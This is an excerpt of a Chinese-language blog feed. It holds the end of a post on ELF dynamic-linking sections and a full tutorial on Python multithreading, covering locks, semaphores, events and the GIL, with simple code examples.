“SO_NAME”</td></tr><tr><td>DT_RPATH</td><td>动态链接共享对象搜索路径</td></tr><tr><td>DT_INIT</td><td>初始化代码地址</td></tr><tr><td>DT_FINIT</td><td>结束代码地址</td></tr><tr><td>DT_NEED</td><td>依赖的共享对象文件，d_ptr表示所以来的共享对象文件名</td></tr><tr><td>DT_REL<br>DT_RELA</td><td>动态链接重定位段表地址</td></tr><tr><td>DT_RELENT<br>DT_RELAENT</td><td>动态重读位表入口数量</td></tr></tbody></table></div><blockquote><p>可以把<code>.dynamic</code>段看成动态链接下ELF文件的文件头</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -d <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2efc contains 26 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x1000</span><br><span class="line"> 0x0000000d (FINI)                       0x12e8</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x3ef4</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3ef8</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x1ec</span><br><span class="line"> 0x00000005 (STRTAB)                     0x29c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x20c</span><br><span class="line"> 0x0000000a (STRSZ)                      182 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x4000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3e4</span><br><span class="line"> 0x00000011 (REL)                        0x3a4</span><br><span class="line"> 0x00000012 (RELSZ)                      64 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: PIE</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x364</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x352</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h4 id="②-dynsym"><a href="#②-dynsym" class="headerlink" title="② .dynsym"></a>② .dynsym</h4><blockquote><p>与.symtab不同的是，“.dynsym” 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存，很多时候动态链接模块同时拥有“.dynsym“和”.symtab“两个表，<font color="navy"><strong>”.symtab“ 中往往保存了所有符号，包括”.dynsym“ 中的符号。</strong></font></p></blockquote><font size="2">和”.symtab“类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接是叫做符号字符串表”.strtab“(String Tab)，在这里就**动态符号字符串表**”.dynstr“(Dynamic String Table)；由于在动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的**符号哈希表**（.hash）</font><h4 id="③-动态链接重定位表-rel"><a href="#③-动态链接重定位表-rel" class="headerlink" title="③ 动态链接重定位表.rel.*"></a>③ 动态链接重定位表.rel.*</h4><blockquote><ul><li>”.rel.dyn“实际上是对数据引用的修正，它所修正的位置位于”.got“以及数据段</li><li>”.rel.plt“是对函数引用的修正，它所修正的位置位域”.got.plt“</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-知识储备&quot;&gt;&lt;a href=&quot;#0x00-知识储备&quot; class=&quot;headerlink&quot; title=&quot;0x00 知识储备&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 知识储备&lt;/font&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-前言&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程介绍</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88149%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（149）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-27T08:46:09.487Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-什么是多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是多线程font"></a> <font color="navy">0x00 什么是多线程？</font></h3><blockquote><p><font size="2">在计算机编程中，一个基本的概念就是同时对多个任务加以控制。许多程序设计问题都要求程序能够停下手头的工作，改为处理其他一些问题，再返回主进程。可以通过多种途径达到这个目的。最开始的时候，那些掌握机器低级语言的程序员编写一些“中断服务例程”，主进程的暂停是通过硬件级的中断实现的。尽管这是一种有用的方法，但编出的程序很难移植，由此造成了另一类的代价高昂问题。中断对那些实时性很强的任务来说是很有必要的。但对于其他许多问题，只要求将问题划分进入独立运行的程序片断中，使整个程序能更迅速地响应用户的请求。<br><strong>最开始，线程只是用于分配单个处理器的处理时间的一种工具。但假如操作系统本身支持多个处理器，那么每个线程都可分配给一个不同的处理器，真正进入“并行运算”状态</strong>。从程序设计语言的角度看，多线程操作最有价值的特性之一就是程序员不必关心到底使用了多少个处理器。程序在逻辑意义上被分割为数个线程;假如机器本身安装了多个处理器，那么程序会运行得更快，毋需作出任何特殊的调校。根据前面的论述，大家可能感觉线程处理非常简单。但必须注意一个问题：共享资源!如果有多个线程同时运行，而且它们试图访问相同的资源，就会遇到一个问题。举个例子来说，两个线程不能将信息同时发送给一台打印机。为解决这个问题，对那些可共享的资源来说(比如打印机)，它们在使用期间必须进入锁定状态。所以一个线程可将资源锁定，在完成了它的任务后，再解开(释放)这个锁，使其他线程可以接着使用同样的资源。<br>多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。<br>一个采用了多线程技术的应用程序可以更好地利用系统资源。其主要优势在于充分利用了CPU的空闲时间片，可以用尽可能少的时间来对用户的要求做出响应，使得进程的整体运行效率得到较大提高，同时增强了应用程序的灵活性。更为重要的是，由于同一进程的所有线程是共享同一内存，所以不需要特殊的数据传送机制，不需要建立共享存储区或共享文件，从而使得不同任务之间的协调操作与运行、数据的交互、资源的分配等问题更加易于解决。</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading <span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread <span class="keyword">import</span> time,os</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-python多线程详解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-python多线程详解font"></a> <font color="navy">0x01 python多线程详解</font></h3><h4 id="1什么是线程"><a class="markdownIt-Anchor" href="#1什么是线程"></a> 1.什么是线程？</h4><blockquote><p>线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。</p></blockquote><h4 id="2为什么要使用多线程"><a class="markdownIt-Anchor" href="#2为什么要使用多线程"></a> 2.为什么要使用多线程？</h4><p>线程在程序中是独立的、并发的执行流。与分隔的进程相比，进程中线程之间的隔离程度要小，它们共享内存、文件句柄    和其他进程应有的状态。因为线程的划分尺度小于进程，使得多线程程序的并发性高。进程在执行过程之中拥有独立的内存单元，而多个线程共享内存，从而极大的提升了程序的运行效率。</p><p>线程比进程具有更高的性能，这是由于同一个进程中的线程都有共性，多个线程共享一个进程的虚拟空间。线程的共享环境包括进程代码段、进程的共有数据等，利用这些共享的数据，线程之间很容易实现通信。操作系统在创建进程时，必须为改进程分配独立的内存空间，并分配大量的相关资源，但创建线程则简单得多。因此，使用多线程 来实现并发比使用多进程的性能高得要多。</p><blockquote><p>总结起来，使用多线程编程具有如下几个优点：</p><ul><li>进程之间不能共享内存，但线程之间共享内存非常容易。</li><li>操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此使用多线程来实现多任务并发执行比使用多进程的效率高 。</li><li>python语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了python的多线程编程。</li></ul></blockquote><h4 id="3普通创建方式"><a class="markdownIt-Anchor" href="#3普通创建方式"></a> 3.普通创建方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'0s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=run,args=(<span class="string">'t1'</span>,))     <span class="comment"># target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在</span></span><br><span class="line">    t2 = threading.Thread(target=run,args=(<span class="string">'t2'</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="4自定义线程"><a class="markdownIt-Anchor" href="#4自定义线程"></a> 4.自定义线程</h4><blockquote><p>继承threading.Thread来定义线程类，其本质是重构Thread类中的run方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n)</span>:</span></span><br><span class="line">        super(MyThread,self).__init__()   <span class="comment">#重构run函数必须写</span></span><br><span class="line">        self.n = n</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'task'</span>,self.n)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'2s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'1s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'0s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = MyThread(<span class="string">'t1'</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">'t2'</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="5守护线程"><a class="markdownIt-Anchor" href="#5守护线程"></a> 5.守护线程</h4><p>下面这个例子，这里使用setDaemon(True)把所有的子线程都变成了主线程的守护线程，因此当主线程结束后子线程也会随之结束，所以当主线程结束后，整个程序就退出了。</p><blockquote><p>所谓’线程守护’，就是主线程不管该线程的执行情况，只要是其他子线程结束且主线程执行完毕，主线程都会关闭。也就是说:主线程不等待该守护线程的执行完再去关闭。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>通过执行结果可以看出，设置守护线程之后，当主线程结束时，子线程也将立即结束，不再执行 ‘’’ ‘’’</p></blockquote><h4 id="6主线程等待子线程结束"><a class="markdownIt-Anchor" href="#6主线程等待子线程结束"></a> 6.主线程等待子线程结束</h4><p>为了让守护线程执行结束之后，主线程再结束，我们可以使用join方法，让主线程等待子线程执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'5s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)    <span class="comment">#把子线程设置为守护线程，必须在start()之前设置</span></span><br><span class="line">    t.start()</span><br><span class="line">    t.join()     <span class="comment">#设置主线程等待子线程结束</span></span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><h4 id="7多线程共享全局变量"><a class="markdownIt-Anchor" href="#7多线程共享全局变量"></a> 7.多线程共享全局变量</h4><p>线程时进程的执行单元，进程时系统分配资源的最小执行单位，所以在同一个进程中的多线程是共享资源的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">g_num = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span>  g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        g_num+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'in work1 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    print(<span class="string">'in work2 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=work1)</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    t2=threading.Thread(target=work2)</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，当多个线程同时修改同一条数据时可能会出现脏数据，    所以出现了线程锁，即同一时刻允许一个线程执行操作。线程锁用于锁定资源，可以定义多个锁，像下面的代码，当需要独占    某一个资源时，任何一个锁都可以锁定这个资源，就好比你用不同的锁都可以把这个相同的门锁住一样。  由于线程之间是进行随机调度的，如果有多个线程同时操作一个对象，如果没有很好地保护该对象，会造成程序结果的不可预期， 我们因此也称为“线程不安全”。 为了防止上面情况的发生，就出现了互斥锁（Lock）</p><h4 id="8互斥锁lock"><a class="markdownIt-Anchor" href="#8互斥锁lock"></a> 8.互斥锁（Lock）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    lock.acquire()</span><br><span class="line">    temp = n</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    n = temp<span class="number">-1</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line">    n = <span class="number">100</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        p = Thread(target=work)</span><br><span class="line">        l.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h4 id="9递归锁"><a class="markdownIt-Anchor" href="#9递归锁"></a> 9.递归锁</h4><p>RLcok类的用法和Lock类一模一样，但它支持嵌套，在多个锁没有释放的时候一般会使用RLock类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(lock)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    lock.acquire()</span><br><span class="line">    gl_num += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(gl_num)</span><br><span class="line">    lock.release()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gl_num = <span class="number">0</span></span><br><span class="line">    lock = threading.RLock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=func,args=(lock,))</span><br><span class="line"><span class="comment">#         t.start()</span></span><br></pre></td></tr></table></figure><h4 id="10信号量boundedsemaphore类"><a class="markdownIt-Anchor" href="#10信号量boundedsemaphore类"></a> 10.信号量（BoundedSemaphore类）</h4><p>互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据，比如厕所有3个坑，那最多只允许3个人上厕所，后面的人只能等里面有人出来了才能再进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n,semaphore)</span>:</span></span><br><span class="line">    semaphore.acquire()   <span class="comment">#加锁</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'run the thread:%s\n'</span> % n)</span><br><span class="line">    semaphore.release()    <span class="comment">#释放</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    semaphore = threading.BoundedSemaphore(<span class="number">5</span>)   <span class="comment">#最多允许5个线程同时运行</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        t = threading.Thread(target=run,args=(<span class="string">'t-%s'</span> % i,semaphore))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'----------all threads done-----------'</span>)</span><br></pre></td></tr></table></figure><h4 id="11事件"><a class="markdownIt-Anchor" href="#11事件"></a> 11.事件</h4><p>python线程的事件用于主线程控制其他线程的执行，事件是一个简单的线程同步对象，其主要提供以下的几个方法：</p><ul><li>clear将flag设置为 False</li><li>set将flag设置为 True</li><li>is_set判断是否设置了flag</li><li>wait会一直监听flag，如果没有检测到flag就一直处于阻塞状态</li></ul><p>事件处理的机制：全局定义了一个Flag，当Flag的值为False，那么event.wait()就会阻塞，当flag值为True，那么event.wait()便不再阻塞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">event = threading.Event()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lighter</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    event.set()         <span class="comment">#初始者为绿灯</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> &lt; count &lt;=<span class="number">10</span>:</span><br><span class="line">            event.clear()  <span class="comment">#红灯，清除标志位</span></span><br><span class="line">            print(<span class="string">"\33[41;lmred light is on...\033[0m]"</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; <span class="number">10</span>:</span><br><span class="line">            event.set()    <span class="comment">#绿灯，设置标志位</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\33[42;lmgreen light is on...\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">car</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.is_set():     <span class="comment">#判断是否设置了标志位</span></span><br><span class="line">            print(<span class="string">'[%s] running.....'</span>%name)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[%s] sees red light,waiting...'</span>%name)</span><br><span class="line">            event.wait()</span><br><span class="line">            print(<span class="string">'[%s] green light is on,start going...'</span>%name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># startTime = time.time()</span></span><br><span class="line">light = threading.Thread(target=lighter,)</span><br><span class="line">light.start()</span><br><span class="line"></span><br><span class="line">car = threading.Thread(target=car,args=(<span class="string">'MINT'</span>,))</span><br><span class="line">car.start()</span><br><span class="line">endTime = time.time()</span><br><span class="line"><span class="comment"># print('用时：',endTime-startTime)</span></span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-gil-全局解释器-font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-gil-全局解释器-font"></a> <font color="navy">0x02 GIL  全局解释器 </font></h3><blockquote><p>在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核        同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。GIL的全程是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在cpython中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。而在pypy和jpython中是没有GIL的python在使用多线程的时候，调用的是c语言的原生过程。</p></blockquote><p>python针对不同类型的代码执行效率也是不同的：</p><ol><li><p>CPU密集型代码（各种循环处理、计算等），在这种情况下，由于计算工作多，ticks技术很快就会达到阀值，然后出发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。</p></li><li><p>IO密集型代码（文件处理、网络爬虫等设计文件读写操作），多线程能够有效提升效率（单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序的执行 效率）。所以python的多线程对IO密集型代码比较友好。 ‘’’ ‘’’</p></li></ol><blockquote><p>主要要看任务的类型，我们把任务分为I/O密集型和计算密集型，而多线程在切换中又分为I/O切换和时间切换。如果任务属于是I/O密集型，    若不采用多线程，我们在进行I/O操作时，势必要等待前面一个I/O任务完成后面的I/O任务才能进行，在这个等待的过程中，CPU处于等待    状态，这时如果采用多线程的话，刚好可以切换到进行另一个I/O任务。这样就刚好可以充分利用CPU避免CPU处于闲置状态，提高效率。但是    如果多线程任务都是计算型，CPU会一直在进行工作，直到一定的时间后采取多线程时间切换的方式进行切换线程，此时CPU一直处于工作状态，    此种情况下并不能提高性能，相反在切换多线程任务时，可能还会造成时间和资源的浪费，导致效能下降。这就是造成上面两种多线程结果不能的解释。</p></blockquote><p><strong>结论</strong>：<font color="red">I/O密集型任务，建议采取多线程，还可以采用多进程+协程的方式(例如:爬虫多采用多线程处理爬取的数据)；对于计算密集型任务，python此时就不适用了。</font></p>]]></content>
    
    <summary type="html">
    
      
      
